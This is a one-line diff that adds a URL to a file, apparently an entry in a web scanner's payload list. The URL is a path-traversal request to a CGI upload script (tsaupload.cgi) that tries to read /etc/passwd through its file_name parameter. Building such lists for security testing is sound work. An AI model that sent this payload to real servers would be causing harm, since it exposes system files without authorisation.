@@ -1,0 +1,1 @@
+/cgi-bin/tsaupload.cgi?file_name=../../../../../..//etc/passwd&password=
